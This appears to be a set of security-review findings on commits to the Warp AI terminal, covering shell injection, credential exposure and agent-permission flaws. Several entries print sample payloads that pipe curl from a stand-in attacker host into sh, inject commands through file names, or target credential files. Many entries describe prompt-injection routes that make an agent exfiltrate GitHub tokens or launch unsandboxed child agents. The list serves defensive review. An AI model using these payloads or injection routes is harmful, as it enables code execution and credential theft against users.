title: AI read-only tools allow shell command injection
description: The read-only AI tools build shell command strings with attacker/model-controlled paths, grep queries, and glob patterns. These values are wrapped in quotes or only partially escaped, but shell metacharacters such as command substitution in POSIX shells (`$(...)`, backticks) and PowerShell expandable-string syntax still execute. For example, a Grep action with a path like `$(curl -fsSL https://attacker/p|sh)` reaches `test -f "{path}"` before the actual grep, and the shell executes the substitution even though the tool is only supposed to read files. The auto-execution gate only checks file-read permission for the requested path, and the default/AgentDecides file-read policy currently allows reading without user approval, so a prompt-injected model response can turn an auto-approved read-only action into arbitrary command execution under the user's local shell or a remote session shell.

title: Agent streams continue hidden after conversation switch
description: When `try_enter_agent_view` is called while another conversation is already active, the old conversation is exited with `is_exit_before_new_entrance` set to `true`. This commit makes `BlocklistAIController` return early for that flag before it checks whether the old conversation is in progress and calls `cancel_conversation_progress`. It also keeps the old conversation registered as an active event consumer in `ActiveAgentViewsModel`. As a result, normal UI paths that open or start a different conversation can leave the previous in-progress agent running in the background instead of cancelling its stream and pending actions. In an AI terminal, this is security-relevant: prompt-injected or malicious autonomous agents that already have permission to run tools/commands can continue producing tool calls or executing queued/pending work after the user believes they have navigated away from that agent.

title: GitHub tokens persisted in agent-readable dotfiles
description: The new git credential flow retrieves fresh GitHub credentials for a task and persists the tokens in global home-directory credential files. Although the files are chmod 0600 on Unix, that does not protect them from the agent process itself, third-party harnesses, MCP tools, or any same-user process inside the sandbox. The files are written before the harness executes and are not removed when the harness exits; the refresh loop also keeps replacing them with fresh tokens for long-running agents. Because Warp's agent can be influenced by untrusted repository contents, terminal output, attachments, or model/tool results, a prompt-injection attacker can ask the agent to read ~/.git-credentials, read ~/.config/gh/hosts.yaml, run gh auth token, or use git credential fill and exfiltrate a GitHub token. Persisting the token in standard credential files also broadens its availability beyond the specific git operations that need it.

title: Feedback skill runs version helper via hijackable relative path
description: The new feedback-skill guidance tells the agent to run `python3 scripts/resolve_warp_version.py` but does not anchor the command to the trusted bundled skill directory. Agent shell commands run in the active terminal/session working directory, which can be an attacker-controlled repository. A repository containing a malicious `scripts/resolve_warp_version.py` can therefore be executed when the user invokes the feedback skill for a bug/regression and the agent follows the platform guidance to fill in the Warp version. This is especially risky because the command is presented as a benign metadata read helper; Warp's command autoexecution path can allow commands classified as read-only, and a model may reasonably mark this helper as read-only. The previous version-resolution instruction read `../../metadata/version.json` as data; this commit introduces a new code-execution step for that field. The safer pattern would be to read the metadata file directly, invoke the helper by an absolute trusted path derived from the bundled skill location, or provide a non-shell built-in tool for reading packaged version metadata.

title: Dogfood skill can run untrusted code with staging API key
description: The new `verify-ui-change-in-cloud` skill tells the agent to accept any repository whose remote URL merely contains `warpdotdev/warp`, then spawn a remote child agent in a fixed Warp Dev Environment with computer use enabled. The child skill then instructs the agent to launch the repository with `cargo run -- --api-key $STAGING_USER_WARP_API_KEY`. A remote URL substring check is not an ownership check: an attacker-controlled repository or mirror URL can contain that substring while not being the canonical `github.com/warpdotdev/warp` repository. If a dogfood/local user invokes or accepts this skill while in such a repo or on an untrusted branch, the cloud agent may build and run attacker-controlled Rust/build-script code in the Warp dev environment and provide the staging API key on the command line. That code can read the environment/argv and exfiltrate the staging API key and any other environment secrets available in that cloud environment. Passing the key via `--api-key` also exposes it through process arguments.

title: Codex child agents bypass Warp permissions
description: Codex is now accepted as a local child harness and `prepare_local_harness_child_launch` builds a command of `codex --dangerously-bypass-approvals-and-sandbox <prompt>`. StartAgent actions are hard-coded to autoexecute, and the prepared command is run in a hidden terminal pane. Because Codex's bypass flag disables both Codex approvals and sandboxing, an attacker who can influence agent/model output in an orchestration-enabled session can cause Warp to spawn a hidden Codex child with attacker-controlled instructions that can run local shell commands outside Warp's normal ActionPermission confirmation path. This newly affects users with Codex installed/authenticated; the broader StartAgent autoexecution pattern existed, but this commit introduces the Codex-specific unsandboxed path.

title: Handoff can upload attacker-seeded local files
description: Adding HandoffLocalCloud to DOGFOOD_FLAGS enables the /move-to-cloud and footer handoff entry points. The handoff flow forks the active conversation, extracts filesystem paths from the conversation, derives orphan files, and uploads their bytes as a snapshot. The path extractor walks AIAgentOutputMessageType::Action messages and includes RequestFileEdits and UploadArtifact paths without checking whether the corresponding action result succeeded, was accepted by the user, or was generated on this machine. For paths outside a git repo, derive_touched_workspace only checks that the path exists and is a file, and gather_file then reads and uploads the file content. A prompt-injected or malicious/restored conversation can therefore seed an absolute path such as a private key or cloud credential file via a file-edit/upload request; if the user later clicks handoff, that file may be uploaded to Warp cloud as an orphan-file snapshot even if the user never approved the original action.

title: Run-agents auto-launch ignores unapproved capabilities
description: The commit introduces auto-launch for run_agents when an approved OrchestrationConfig matches the request. However, the matching logic explicitly excludes computer_use_enabled, skills, prompts, and agent configs, and treats empty model/harness/environment/host fields as matching. When auto-launch fires, the code executes state.to_request(), i.e. the original model/tool-call request, rather than a request normalized to the approved config. The executor then forwards computer_use_enabled and skills from that request into the child agent execution mode. As a result, after a user approves orchestration for a plan, attacker-controlled prompt/model output can send a run_agents call that matches the visible config but sets computer_use_enabled=true or supplies other unapproved capabilities; the confirmation card is skipped and child agents spawn immediately with those capabilities.

title: RunAgents confirmation hides child agent prompts
description: The commit introduces the RunAgents tool and a confirmation card, but the card only renders the tool-call summary and agent names. The request's base_prompt and each agent_run_configs[].prompt are neither shown nor editable in the normal card or the editor; the editor only exposes harness/location/host/environment/model controls. When the user clicks Accept, the full hidden request is forwarded unchanged. The executor then concatenates the hidden base_prompt and per-agent prompt and dispatches child agents. For local Claude child agents, the launched command uses --dangerously-skip-permissions in an off-screen pane, so the user's only meaningful consent point is this card. An attacker who can influence model/tool output via prompt injection could cause a RunAgents tool call with a benign visible summary such as 'spawn reviewers' and harmless-looking agent names, while the hidden prompts instruct child agents to read secrets, modify files, or execute commands. This makes the confirmation misleading and can turn one click into unauthorized local or cloud agent actions.

title: AI rule links can reach unsafe external editor launch
description: Previously, AIFactViewEvent::OpenFile always called open_code, keeping AI rules/facts file opens inside Warp. The new code calls resolve_file_target_with_editor_choice with settings.open_file_editor and then open_file_with_target. For project-scoped AI rules, the displayed path comes from repository-scanned WARP.md/AGENTS.md files, so an attacker-controlled repository can influence parent directory names in the path. If the user has disabled the Markdown viewer preference and uses SystemDefault with a supported default editor or an ExternalEditor on Linux, open_file_with_target can spawn the Linux external editor path. That launcher builds a shell command with sh -c and appends the file path from .desktop field-code substitution without shell quoting, so a path containing shell metacharacters can execute commands when the user clicks Open file in the rules/facts panel. The unsafe Linux launcher existed before, but this commit introduces a new source-to-sink route from the AI rules/facts panel that was previously constrained to Warp's internal editor.

title: Codex resume trusts transcript cwd while unsandboxed
description: The new Codex resume implementation fetches a stored Codex transcript, writes its JSONL entries back under `~/.codex/sessions`, and then executes `codex resume --dangerously-bypass-approvals-and-sandbox`. Unlike the Claude resume path, the Codex runner ignores the supplied `working_dir` parameter and does not rewrite the JSONL `session_meta.payload.cwd` or otherwise validate it against the current run directory before rehydration. Since the Codex resume state is the JSONL file itself, a stale, corrupted, or attacker-controlled accessible transcript can carry an arbitrary prior `cwd` into the resumed CLI. Combined with the dangerous bypass flag, the resumed agent may read, modify, or exfiltrate files from a directory other than the directory the user selected for the run.

title: Stale cloud worker host can route agents to prior self-hosted host
description: This commit moves cloud-agent worker host selection into persistent UI/view-model state. On initialization and on UserWorkspacesEvent::TeamsChanged, the code computes an effective host from WARP_CLOUD_MODE_DEFAULT_HOST or the current workspace default_host_slug, but only calls set_default_host and set_worker_host when that value is Some. If the effective host later becomes None, the old HostSelector.default_host and AmbientAgentViewModel.worker_host remain unchanged. reset_for_new_cloud_prompt also leaves worker_host intact, and spawn_agent sends the stale worker_host in AgentConfigSnapshot. As a result, after a workspace/team switch or an admin removing default_host_slug, subsequent cloud agents can still be dispatched to the previous self-hosted worker even though the current workspace has no default host. If a user was previously in a workspace controlled by an attacker or untrusted admin, prompts/attachments/execution may be routed to that prior self-hosted worker after switching into another context.

title: FreeBSD external-editor path enables shell injection
description: FreeBSD is now routed into `app/src/util/file/external_editor/linux.rs`. That implementation expands FreeDesktop `.desktop` Exec field codes by concatenating raw file paths into a command string and then runs it via `sh -c`. A malicious repository or archive can contain a file whose name includes shell metacharacters, such as `file.rs; curl attacker|sh #`. If the victim opens that file with a supported external editor whose `.desktop` Exec uses `%f`, `%F`, `%u`, or `%U`, the injected shell syntax is interpreted by `sh -c` and executes with the user's privileges. This shell-injection primitive already exists in the Linux implementation, but this commit newly exposes it on FreeBSD by widening the cfg guards and dispatch path.

title: warp:// path links can auto-execute local scripts
description: The new helper is described as handling file:// opens, but open_file is also used for custom warp:// action deep links. A remote page or document can initiate a registered warp://action/new_tab?path=... or warp://action/new_window?path=... URL. The handler expands a leading ~, accepts the arbitrary path, and calls open_file. After this commit, common script files are classified as ExecuteInSession: on Unix, executable .sh/.bash/.zsh/.fish/.ksh or executable shebang files; on Windows, any .ps1/.bat/.cmd. The ExecuteInSession branch queues the path as a terminal pending command, and Warp's terminal later executes pending commands on bootstrap/block completion. Thus a deep link to a local attacker-controlled script that previously opened in the editor can now execute in the user's shell without an in-app confirmation. The broader executor sink for non-openable/binary files appears to have pre-existed, but this commit newly expands it to common text script formats reachable through warp:// deep links.

title: SSH remote server trusts preexisting remote binaries
description: The new release flag rollout makes `FeatureFlag::SshRemoteServer` enabled for all non-Windows release builds. When an SSH session starts, Warp checks only whether the expected remote binary path is executable (`test -x ~/.warp/remote-server/oz`). If it exists, Warp skips the install prompt and immediately launches that binary over SSH as `remote-server-proxy`. During the protocol initialize handshake, Warp sends the current bearer token/API key to the remote process. A malicious or compromised SSH host can pre-place an executable at the expected path, receive the automatic launch, read the first protobuf message from stdin, and steal the user's Warp server token without any remote-server install confirmation. The new control arm does not prevent this because it sets the feature flag on and only changes behavior when the binary is missing; an existing attacker-controlled binary still follows the `Ok(true)` auto-connect path.
relevant_paths: crates/warp_features/src/lib.rs | app/src/server/experiments/mod.rs | app/src/terminal/writeable_pty/remote_server_controller.rs | crates/remote_server/src/setup.rs | app/src/remote_server/ssh_transport.rs | app/src/remote_server/auth_context.rs | crates/remote_server/src/client/mod.rs

title: Remote reconnect can leak new user's bearer token
description: The new remote-server auth flow stores an auth context whose closures read the current AuthState each time they are called. Initial connections capture an identity_key for filtering token rotations, but reconnects reuse the stored transport/auth_context and call run_connect_and_handshake, which fetches the current bearer token and sends it in Initialize without checking that the current identity still matches the session's stored identity_key. SshTransport also derives the remote proxy command from the current auth_context at connect time. As a result, a remote session established under user A can later reconnect after Warp has switched to user B and send user B's bearer token to the remote daemon/host, while the manager still records the session as belonging to user A. The explicit identity filter in rotate_auth_token does not protect the initialize handshake used during reconnects.

title: Unauthenticated URI path can auto-run local executables
description: The changed function is reached both by file:// URLs and by browser-reachable warp://action/new_tab or warp://action/new_window links with a path query parameter. For non-markdown, non-Warp-openable files, open_file creates a terminal session at the file's parent directory and calls execute_file. execute_file sets the file path as a pending command, and terminal bootstrap/block-completion code later automatically executes pending commands. Before this commit, open_file returned immediately when AuthState::is_logged_in() was false. After the removal, users in loginless/logged-out modes can have an external URI cause Warp to open a terminal and run an existing local executable path without an in-app confirmation. This is especially risky for custom-protocol links from web content, and can become arbitrary code execution if an attacker can get a predictable executable onto the victim system.

title: PowerShell injection in linked worktree branch clicks
description: The new branch picker flow reads `git worktree list --porcelain`, stores the resolved worktree path as hidden menu action data, and on click emits `cd <worktree-path>` to the active terminal. The command formatter always uses POSIX single-quote escaping (`'` -> `'\''`) and does not know which shell will execute the command. That quoting is not valid PowerShell escaping, where single quotes are escaped by doubling them. A malicious repository/worktree path such as `C:\tmp\repo';calc;'x` can therefore produce a command like `cd 'C:\tmp\repo'\'';calc;'\''x'`; in PowerShell the backslash does not escape the quote, so the semicolon-delimited payload can be parsed as a separate command. Normal branch names are also formatted through the same shell-agnostic function, but this commit newly introduces the linked-worktree path-to-`cd` action. The fix should generate shell-specific click commands, use PowerShell-safe quoting such as `Set-Location -LiteralPath '<path with '' escaping>'`, or avoid shell interpolation entirely.

title: Uncapped scrollback reflow on CLI-agent resize
description: In the FullGridClearBehavior::Clear resize path, the patch now calls flat_storage.set_columns(num_cols) and immediately returns. FlatStorage::set_columns rebuilds the row index for the new width, which can greatly increase the number of logical rows when resizing to a narrower pane. Unlike the normal resize path, this early path does not call apply_max_rows() after reflow. As a result, an active third-party CLI agent or cloud/shared session with attacker-controlled terminal output can fill scrollback up to the configured limit at a wide width, then trigger or wait for a narrow resize, causing FlatStorage to allocate and expose far more row-index entries than the scrollback cap. This can cause excessive CPU/memory use or a client crash. The original RowIterator crash described by the commit is fixed, but this new uncapped reflow behavior is introduced by the added set_columns call in the early-return path.

title: Handshake delay allows remote push-message memory DoS
description: Before this change, the manager started draining the client's event receiver as soon as the connection entered Initializing, dropping push events until the session became Connected. The commit moved event stream draining to mark_session_connected so the new post-initialize codebase-index snapshot would not be dropped. However, RemoteServerClient::reader_task still treats any empty-request_id ServerMessage as a push and sends it to an unbounded async_channel. A malicious or compromised remote server can withhold InitializeResponse and stream large or numerous push messages during the 120-second initialize timeout. Because event_rx is not consumed during that window, these events accumulate in memory and can exhaust the local Warp client process. The protocol has a 64 MB per-message cap, but no bound on queued push events.

title: Local handoff can snapshot wrong local files
description: The commit adds `/move-to-cloud` and a footer chip for local-to-cloud handoff, but neither the slash command availability nor the workspace action verifies that the active conversation is from a local session. The handoff path extracts `working_directory` and file paths from the conversation, then calls `derive_touched_workspace`, which walks those paths on the client machine. On submit, the resulting local repo roots and orphan files are uploaded via `upload_snapshot_for_handoff`. In a remote, shared, or cloud-agent conversation, those paths describe another machine/sandbox, but the client treats them as local paths. If they collide with paths on the user's machine, Warp can upload local repo diffs/untracked files or orphan file contents that were not part of the conversation being handed off. The repository snapshot further captures the entire dirty repo diff and untracked non-ignored files, so a single matching cwd can include unrelated local changes.

title: Windows installer disables RedirectionGuard
description: The installer now sets `RedirectionGuard=no`. RedirectionGuard is a Windows process mitigation that blocks traversal through symlinks/junctions created by non-admin users, returning ERROR_UNTRUSTED_MOUNT_POINT instead. Disabling it is security-significant because this installer can be run in administrative/all-users mode and performs privileged file copies and recursive deletions under `{app}` and user data paths. If an attacker can plant a reparse point in a selected, existing, or cleanup path that the elevated installer/uninstaller later traverses, those privileged operations can be redirected to protected locations, enabling arbitrary privileged file overwrite or deletion. The new Rust code only logs when the mitigation is present; it does not preserve the mitigation for the installer while preventing inheritance by the launched app.

title: Unbounded read of dropped CLI-agent image paths
description: The commit adds a new path for image drops while a CLI agent is running: paths with image-looking extensions are passed to `paste_dropped_images_to_cli_agent`, which stats the path and then calls `async_fs::read` to load the entire file before writing it to the clipboard. This cap is ineffective for non-regular files and TOCTOU cases. For example, a symlink named `screenshot.png` pointing to `/dev/zero`, a FIFO, or a file replaced after the metadata check can pass the `meta.len()` test and then cause `async_fs::read` to block indefinitely or allocate until the process runs out of memory. Before this commit, dropping such a path into a long-running CLI-agent prompt would type the escaped path rather than reading file contents in Warp. A malicious repository or local directory can contain an image-extension symlink/special file and induce the user to drag it into an active CLI-agent session, causing a local denial of service. The safer pattern is to reject non-regular files and read from the same opened handle with a hard byte limit, e.g. read at most `MAX_IMAGE_SIZE_BYTES_FOR_CLI_AGENT + 1` bytes and reject if exceeded.

title: Non-owner viewers can start cloud follow-ups
description: The commit adds a cloud "Continue" button to conversation-ended tombstones and routes submitted prompts to `submit_run_followup`. The owned-task helper correctly checks whether the current user is the ambient task creator, but that check is only used to decide whether to enable input directly. If the task is not owned by the current user, the code falls through and inserts a tombstone. The tombstone creates a cloud Continue button for any ambient `task_id` when the feature flag is enabled. Clicking it only checks that the terminal's ambient view model has the same task id; it does not check ownership, shared-session executor/edit permissions, or task follow-up eligibility. The subsequent input handler submits the prompt to the cloud follow-up API for that task id. As a result, a read-only/non-owner participant in a shared ambient session can be offered a path to send arbitrary follow-up instructions to the cloud run. If the backend endpoint authorizes based on shared access or lacks a separate creator/executor check, this becomes an authorization bypass allowing the viewer to drive cloud agent execution against another user's task/environment and potentially access or mutate resources/secrets available to that cloud agent.

title: Cancelled command output may be sent to AI after follow-up
description: Before this commit, finished action results marked as cancelled were not prepended to the next user-submitted query. The new code prepends all finished results. Most cancelled result variants are ignored during API conversion, but a shell command interrupted with Ctrl-C is represented as RequestCommandOutputResult::Completed with exit code 130, and is also considered cancelled. That variant is converted to an API RunShellCommand result containing the full command output. As a result, if an AI-requested command prints sensitive data and the user interrupts it, the partial unobfuscated terminal output can still be sent to the AI backend on the next user follow-up in that conversation. The intended computer-use rejection fix only needed to preserve a safe rejected RequestComputerUse result; broadly preserving all cancelled results reintroduces data that the prior filter explicitly withheld.

title: Spoofable Codex session ID can trigger transcript upload
description: Codex session IDs are captured from CLIAgentSessionsModel, which is populated from PTY/terminal notifications. For Codex, the listener accepts structured warp://cli-agent notifications when present and forwards them into the session model. Terminal output is attacker-controlled in the threat model: a malicious repository, test, tool output, or prompt-injected agent can emit OSC notifications. This commit newly uses that model-provided session_id as authority for selecting a local transcript file, walks $CODEX_HOME or ~/.codex/sessions for any rollout filename ending in that UUID, and uploads the parsed JSONL to the current server conversation. The uploaded file is not validated against the current process/run, creation time, working directory, or even the SessionMeta payload id. As a result, malicious terminal output during a Codex run can cause Warp to upload an unintended Codex rollout file, such as a stale transcript whose UUID is known or a matching fake/symlinked JSONL created in the sessions tree. If the current conversation is attacker-visible, this can leak prior transcript contents, prompts, tool outputs, paths, and potentially secrets captured in transcripts.

title: Workspace schema cache can leak CI secrets via symlink
description: The commit sets SETTINGS_SCHEMA_CACHE to `${{ github.workspace }}/.settings_schema_cache.json` and changes `prepare_bundled_resources` to use any existing file at that path as the authoritative settings schema. Because the cache path is inside the Git checkout, an attacker who can get a hidden `.settings_schema_cache.json` file or symlink into the release branch can make the first packaging invocation skip generation. Bash `-f` and `cp` follow symlinks, so a symlink to a readable CI secret that exists by bundling time, such as a GnuPG private key imported earlier in the job or another predictable credentials file, will be copied into `resources/settings_schema.json`. That resources directory is then packaged and, on publish runs, uploaded to GitHub/GCS. Even without a symlink, a committed regular file at this path silently poisons the bundled schema and bypasses the generator. The cache should be stored outside the checked-out repository in a freshly-created runner temp directory, removed before first use, and/or rejected if it is a symlink or not produced by the current job.

title: Cloud v2 slash command restrictions are menu-only
description: The commit introduces a NOT_CLOUD_AGENT availability bit and a separate cloud-mode-v2 slash command data source that omits that bit from the session context. This hides commands such as /remote-control and /export-to-file from the new cloud-mode-v2 menu. However, the canonical SlashCommandModel is still constructed with the normal SlashCommandDataSource::new, which always sets NOT_CLOUD_AGENT. The cloud-mode-v2 data source is passed only to CloudModeV2SlashCommandView. As a result, when the menu is closed and the user presses Enter on a directly typed or pasted slash command, SlashCommandModel parses the command against the non-v2 active command set and maybe_handle_enter_for_slash_command executes it with no cloud-mode-v2 availability check. This makes the new cloud-mode-v2 command restrictions bypassable outside the menu path.

title: Codex prompts are exposed in process arguments
description: The Codex harness writes the prompt to a temporary file, but then builds the launch command as `codex ... "$(cat '<prompt_path>')"`. The shell expands `$(cat ...)` before execing the Codex process, so the entire prompt is placed in Codex's argv. On common desktop/server platforms, process command lines are observable via tools such as `ps`, `/proc/<pid>/cmdline`, WMI, activity monitors, or endpoint telemetry. If prompts contain secrets, private repository content, customer data, or sensitive task context, a local low-privileged user or monitoring component can capture them while Codex is running. The temp file approach would otherwise keep prompt contents off the command line; the command substitution defeats that protection. This is introduced for the new Codex harness in this commit; Gemini has a similar pre-existing pattern, but this change adds the same exposure to Codex runs.

title: Raw git errors leaked through code review telemetry
description: The new git dialog telemetry records `err.to_string()` for failed commit, push, publish, and create-PR operations and serializes it directly into the telemetry payload as `error`. The underlying git helpers build those errors from raw git stdout/stderr and gh stderr. These strings can contain user-generated or sensitive data such as repository paths, remote URLs, branch/repository names, hook output, command output, auth diagnostics, or tokens printed by tools/hooks. The event type still reports `contains_ugc()` as false for all code review telemetry, so this data is not routed or handled as UGC/sensitive telemetry. This is especially suspicious because the commit description claims the payload contains only enum kinds and a success boolean, but the actual patch uploads raw error text.

title: CI SSH key is overexposed during release builds
description: The new prepare_environment step starts webfactory/ssh-agent with WARP_CHANNEL_CONFIG_ACCESS_SSH_KEY whenever the repository is warpdotdev/warp-internal. Because this is a standalone setup step, the resulting SSH_AUTH_SOCK remains available to later commands in the job. The next step runs repository-controlled install scripts and later release workflow steps run build scripts and downloaded tooling, so any malicious or compromised code executing in those steps can authenticate with the deploy key and clone or otherwise access the private warp-channel-config repository. The exposure is broader than necessary: the key should be scoped to only the git/cargo install of warp-channel-config, then removed or the agent killed, and it should not be passed to jobs/targets that do not need to install that private repository.

title: First-commit AI diff can leak symlink target contents
description: For repositories without HEAD, this commit replaces the previous failing `git diff HEAD` path with `git diff --cached` plus `git diff`, after which the existing untracked-file synthesis runs. The untracked-file synthesis enumerates `git ls-files --others`, joins each path to the repo path, and opens it with `tokio::fs::File::open`, which follows symlinks. It then reads up to 4000 bytes, formats the bytes as a synthetic diff, and the commit dialog sends that diff to `generate_code_review_content` for AI commit-message generation. A malicious newly initialized project/archive can contain an untracked symlink such as `leak.txt -> ~/.ssh/id_rsa`; opening the commit dialog with AI autogeneration enabled can upload the first text bytes of the symlink target instead of only repository file content. Similar symlink-following behavior existed for untracked files in repositories that already had HEAD, but this commit newly exposes the no-HEAD/first-commit path that previously returned an error before reaching this code.

title: Ambiguous MCP spawn root can execute code from wrong repo
description: File-based MCP installations are keyed by a hash of the server name, JSON template, and variable values, not by the root directory where the config was found. The new spawn_root_for_installation() then maps a UUID back to that hash, enumerates every root that references the hash, sorts them, and uses the first root as the cwd. For a project-scoped MCP server with relative command/args such as `node ./mcp/server.js`, an attacker can create another discovered repository containing an identical `.mcp.json` but malicious relative files. If Warp deduplicates the two configs to one installation, toggling the file-based MCP card starts the server using whichever root sorts first, not necessarily the root the user intended. The UI also starts file-based MCPs by UUID only, so no selected root/provider is passed to the spawner. This can turn a user's opt-in for one repository's MCP server into code execution from a different repository. Project-scoped servers still require user interaction, so this is not no-click RCE, but it weakens the confirmation boundary around untrusted repository MCP configs.

title: Remote daemon can report crashes before user consent is applied
description: This commit routes the remote-server daemon through `run_internal`, which calls `initialize_app`. `initialize_app` initializes crash reporting and replays buffered pre-Sentry errors before `launch()` binds the daemon socket and before the client can send the `Initialize` message containing `crash_reporting_enabled`. The daemon only applies the client-supplied preference inside `handle_initialize`, where it uninitializes Sentry if the client disabled crash reporting. This is too late for crashes, captured errors, breadcrumbs, or other crash-reporting side effects that occur during startup or before the first successful protocol handshake. Because the local privacy setting defaults to crash reporting enabled, a remote daemon without a synced disabled preference can report data even when the connecting client has opted out.

title: Unsanitized PowerShell errors sent to Sentry
description: When PowerShell history loading via a PowerShell command fails but the filesystem fallback succeeds, the new code sends a Sentry message with a `powershell_history` context containing `format!("{powershell_error:?}")`. The `powershell_error` is constructed from raw PowerShell stderr. PowerShell stderr commonly includes the full command line or exception details, including the user's history file path under the Windows profile directory, and can also include attacker-controlled stderr if the PowerShell invocation is influenced by a crafted history path. Crash reporting is enabled by default, so this can disclose local usernames, directory names, or other path-derived sensitive information to crash reporting. The code should avoid attaching raw stderr/path data to Sentry, should redact paths/user-controlled text, and should bound the captured error length.

title: Stale shared-session events can tear down follow-up sessions
description: The commit adds follow-up shared-session attachment by closing the old Network and creating a new one while routing outbound events through current_network. However, inbound subscriptions remain registered per Network and handle_network_events does not verify that the emitting Network is still the current one before applying state changes to the shared TerminalView/TerminalModel. As a result, a late SessionEnded, ViewerRemoved, FailedToReconnect, role/context update, or input update from a replaced session can affect the new active session. In particular, ambient_session_ended clears the model's write-to-PTY sender before checking whether the ended network is still current, and ViewerRemoved/FailedToReconnect unconditionally call shared_session_ended, which marks the viewer finished and clears the active transport. This can cause state confusion and denial of service for the active follow-up cloud-agent session if a stale network event arrives after a new session is attached.

title: Harness cache migration can select Unknown harness
description: The commit changes direct serde serialization for warp_cli::agent::Harness from Rust variant names such as "Oz"/"Claude" to lowercase names such as "oz"/"claude" and adds a serde fallback to Unknown. HarnessAvailabilityModel reads the cached AvailableHarnesses value from private user preferences and accepts it if serde_json parses successfully. Caches written by earlier versions contain the old case-sensitive variant names, so after this commit they can parse as Harness::Unknown rather than being rejected. AmbientAgentViewModel then treats the default Oz harness as unavailable and may select the first enabled cached entry, which is now Unknown. Later, build_default_spawn_config treats any non-Oz harness, including Unknown, as a third-party harness override and can send a config containing type "unknown". A successful online refresh will normally repair the state, but offline startup, refresh failures, or a race before refresh can break cloud-agent spawning for upgraded users.

title: Unbounded local curl in SCP install fallback
description: The SCP fallback defines a 120-second timeout and applies it to the SCP upload and remote extraction steps, but not to the local curl download. The curl invocation only uses --connect-timeout 15, which limits connection establishment but not the total transfer duration. If the download endpoint or an intermediary stalls after connecting, the async task will wait on curl forever and the remote-server install can remain stuck instead of failing cleanly.

title: New AI policy field breaks old cached billing metadata
description: Warp stores team billing metadata as JSON in SQLite and reloads it on startup. This commit adds `is_git_operations_ai_enabled` as a non-optional `bool` to `WarpAiPolicy`, which derives `Deserialize` without `#[serde(default)]`. Any cache written by a prior client version will contain a `warp_ai_policy` object without this new field. Deserializing that old JSON will fail, and the loader suppresses the error with `.ok()`. `Team::from_local_cache` then replaces the missing billing metadata with `BillingMetadata::default()`. As a result, billing-policy decisions can be wrong while offline or before a fresh metadata fetch completes. In the changed Git Operations AI path this mostly fails closed because missing `warp_ai_policy` makes `is_git_operations_ai_enabled()` return false, so I did not find a direct security leak in the new gate. It is still an introduced compatibility/availability bug that can hide or disable billing-gated settings and can make other existing policy checks operate on defaults during startup/offline use.

title: Handoff pane cannot recover after snapshot upload failure
description: In the new local-to-cloud handoff flow, the snapshot upload is started asynchronously when the handoff pane is opened. If that upload returns an error, the model records SnapshotUploadStatus::Failed. Failed is explicitly not considered settled, is_handoff_ready_to_submit returns false, and the input layer refuses to call submit_handoff. submit_handoff also independently returns when snapshot_upload is not settled. There is no path that resets the status to Pending or reruns upload_snapshot_for_handoff from the same pane. As a result, a transient network/auth/service failure during the background snapshot upload permanently wedges that handoff pane; the user keeps seeing the generic preparing-handoff toast and cannot submit from that pane even after connectivity is restored. The parent implementation allowed re-submission after a failed upload by treating Failed as ready and rerunning the upload on submit.

title: Handoff discovery can upload denied local files
description: The new touched-workspace code derives upload candidates from `AIAgentOutputMessageType::Action` messages, not from successful action results. This means a model-controlled `RequestFileEdits` or `UploadArtifact` request contributes its path even if the user rejected it, execution failed, or it was never a write. `UploadArtifact` is a read/upload action guarded by file-read permissions, but the new code classifies it as a write and passes its path to `derive_touched_workspace`. For any such path outside a git repo, `derive_touched_workspace` only checks that the file exists and is a regular file before adding it to `orphan_files`, which the new type documents as being uploaded as raw file contents in the handoff snapshot. A prompt-injection attacker could therefore cause the local agent to request an edit or upload of a sensitive path such as `~/.ssh/id_rsa` or `../../.env`; even if the user rejects the action, starting a local-to-cloud handoff could stage that file for cloud upload. The same extractor also records every exchange working directory unconditionally, which can cause entire git roots from read-only exchanges to be snapshotted. The module appears to be newly introduced and not yet wired to a caller in this commit, but the vulnerability is in the introduced handoff discovery routine intended to drive snapshot upload.

title: Status updates can leave task card buttons stale
description: Before this commit, every ConversationUpdated event rebuilt the management card list via get_tasks_from_model(), which recomputed each card's ActionButtonsConfig. The new handle_conversation_updated() path only calls get_tasks_from_model() when the status transition crosses the active status filter. Because StatusFilter::All never crosses membership, the default All view only calls ctx.notify(). Rendering will pick up fresh status text/icon from the model, but the existing per-card action_buttons_view keeps its old config unless get_tasks_from_model() runs. For task cards, ActionButtonsConfig::for_task() decides whether to expose cancel_task_id from display_status.is_cancellable(), so a task whose effective display status changes from Working to Done/Failed while All is active can still show and emit the stale Cancel action until another full list rebuild occurs. This appears to be a UI/state consistency bug, not a security vulnerability, assuming cancellation is authorized and validated server-side.

title: Copy misfires with input multi-cursors and selected blocks
description: TerminalView::copy now calls editor.selected_text(ctx) and copies it whenever the resulting string is non-empty. However, EditorModel::selected_text joins multiple selections with newline separators, so multiple zero-width cursors in the input can produce a non-empty string even when no text is highlighted. Since the terminal input supports multiple selections/cursors, a user with selected block(s) and multiple empty input cursors can press Copy and get newline characters on the clipboard instead of the selected block content. This is a local functional regression, not a security vulnerability.

title: Vertical drag ghost can corrupt tab handoff state
description: For horizontal tabs, the drag ghost explicitly skips Draggable/DropTarget wrappers. The new vertical-tabs ghost path does not: render_tab_group_for_drag_ghost passes for_drag_ghost=true, but render_tab_group_internal still constructs a Draggable with an on_drop handler and returns it. Because the ghost chip is rendered as a topmost overlay in the target window under the cursor, a drop can be delivered to the target workspace rather than the original source/preview. The DropInto handling then calls perform_handoff on that target workspace. Since target.window_id == caller_window_id in this situation, perform_handoff takes the put-back branch intended for the original source window and may unsubscribe/remove source_tab_index from the target's tab list, then finalize may apply further source cleanup to the target. This can corrupt tab state, remove the wrong tab, leave the original source placeholder behind, or create duplicated/stale pane ownership during vertical-tabs cross-window dragging.

title: Preinstall check exits 1 on supported hosts
description: The added preinstall check script ends with `[ -n "$reason" ] && echo "reason=${reason}"`. For the normal supported path, `reason` is empty, so that test returns exit code 1 and becomes the script's exit status. `SshTransport::run_preinstall_check` treats any nonzero status as an error and discards the parseable stdout, and the manager then records the check as inconclusive (`None`). This does not appear to create a security vulnerability: unsupported hosts set a non-empty reason and still exit 0, so the compatibility gate continues to block known-unsupported glibc/non-glibc systems. The impact is primarily functional/telemetry noise: supported Linux hosts are logged as preinstall-check failures and do not populate preinstall telemetry.

title: Filtered slash sidecar can show details for the wrong item
